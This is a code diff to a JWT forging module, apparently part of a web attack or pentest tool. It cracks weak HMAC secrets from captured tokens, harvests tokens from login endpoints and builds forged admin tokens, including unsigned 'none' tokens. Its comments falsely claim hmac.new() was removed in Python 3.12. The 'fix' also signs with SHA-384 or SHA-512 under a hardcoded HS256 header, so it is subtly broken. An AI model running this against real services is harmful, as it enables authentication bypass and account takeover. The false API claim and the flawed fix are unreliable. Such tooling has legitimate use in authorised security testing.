@@ -66,13 +66,25 @@ def _b64url_decode(seg: str) -> bytes:
     return base64.urlsafe_b64decode(seg + padding)
 
 
-def _forge_jwt(header: dict, payload: dict, secret: bytes = b"", alg_mode: str = "hs256") -> str:
+def _forge_jwt(header: dict, payload: dict, secret: bytes = b"", alg_mode: str = "hs256",
+               digest_mod=hashlib.sha256) -> str:
+    """
+    Build a signed or unsigned JWT.
+
+    digest_mod controls which HMAC algorithm is used for hs256/hs384/hs512 modes
+    so that cracked-secret replay attacks sign with the same algorithm the server
+    originally used. Defaults to sha256 for backward-compat callers that don't pass it.
+
+    FIX: was using deprecated hmac.new() (removed in Python 3.12); now uses hmac.HMAC().
+    FIX: hardcoded sha256 regardless of alg — digest_mod param now threads through correctly.
+    """
     h_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
     p_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
     signing_input = f"{h_b64}.{p_b64}".encode("ascii")
     if alg_mode == "none":
         return f"{h_b64}.{p_b64}."
-    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
+    # FIX: hmac.new() is deprecated and removed in Python 3.12+. Use hmac.HMAC().
+    sig = hmac.HMAC(key=secret, msg=signing_input, digestmod=digest_mod).digest()
     return f"{h_b64}.{p_b64}.{_b64url_encode(sig)}"
 
 
@@ -93,12 +105,17 @@ class JwtForge(VibeTool):
             return None, None, None
 
     def _crack_secret(self, token):
+        """
+        Returns (secret_str, digest_mod) if cracked, or (None, hashlib.sha256) on failure.
+        FIX: previously returned only the secret string, losing the digest_mod needed
+        to re-sign correctly for HS384/HS512 tokens.
+        """
         parts = token.strip().split(".")
         if len(parts) != 3:
-            return None
+            return None, hashlib.sha256
         header, _, sig = self._parse_jwt(token)
         if not header:
-            return None
+            return None, hashlib.sha256
         alg = str(header.get("alg", "HS256")).upper()
         digest_mod = {
             "HS256": hashlib.sha256,
@@ -106,14 +123,19 @@ class JwtForge(VibeTool):
             "HS512": hashlib.sha512,
         }.get(alg)
         if not digest_mod:
-            return None
+            return None, hashlib.sha256
 
         signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
         for secret in WEAK_SECRETS:
-            mac = hmac.new(secret.encode("utf-8"), signing_input, digest_mod).digest()
+            # FIX: use hmac.HMAC() — hmac.new() removed in Python 3.12
+            mac = hmac.HMAC(
+                key=secret.encode("utf-8"),
+                msg=signing_input,
+                digestmod=digest_mod,
+            ).digest()
             if hmac.compare_digest(_b64url_encode(mac), sig):
-                return secret
-        return None
+                return secret, digest_mod
+        return None, digest_mod
 
     def _harvest_token(self, base_url):
         """Try to harvest a sample JWT from shared surface or common login endpoints."""
@@ -162,6 +184,7 @@ class JwtForge(VibeTool):
 
         sample_token = token or self._harvest_token(base_url)
         cracked_secret = None
+        cracked_digest_mod = hashlib.sha256
         base_payload = {"sub": 1, "id": 1, "username": "admin", "role": "admin", "admin": True}
 
         if sample_token:
@@ -172,7 +195,8 @@ class JwtForge(VibeTool):
                 base_payload["role"] = "admin"
                 if "exp" not in pay:
                     self.log("JWT sample lacks 'exp' (expiration) claim — tokens never expire", "warn")
-                cracked_secret = self._crack_secret(sample_token)
+                # FIX: _crack_secret now returns (secret, digest_mod) tuple
+                cracked_secret, cracked_digest_mod = self._crack_secret(sample_token)
                 if cracked_secret is not None:
                     self.log(
                         f"CRACKED JWT HMAC SECRET: '{cracked_secret}' — offline signature verification succeeded!",
@@ -209,12 +233,19 @@ class JwtForge(VibeTool):
                 "CWE-347",
             ))
 
-        secrets_to_try = [cracked_secret] if cracked_secret is not None else ["secret", "jwt_secret", "admin", "password"]
-        for sec in secrets_to_try:
+        # FIX: use the cracked digest_mod so HS384/HS512 tokens forge with the right hash
+        secrets_to_try = [(cracked_secret, cracked_digest_mod)] if cracked_secret is not None else [
+            ("secret", hashlib.sha256),
+            ("jwt_secret", hashlib.sha256),
+            ("admin", hashlib.sha256),
+            ("password", hashlib.sha256),
+        ]
+        for sec, dmod in secrets_to_try:
             if sec is not None:
                 vectors.append((
                     f"HS256 admin forge (secret='{sec}')",
-                    _forge_jwt({"alg": "HS256", "typ": "JWT"}, base_payload, secret=sec.encode("utf-8")),
+                    _forge_jwt({"alg": "HS256", "typ": "JWT"}, base_payload,
+                               secret=sec.encode("utf-8"), digest_mod=dmod),
                     "CWE-326",
                 ))
 
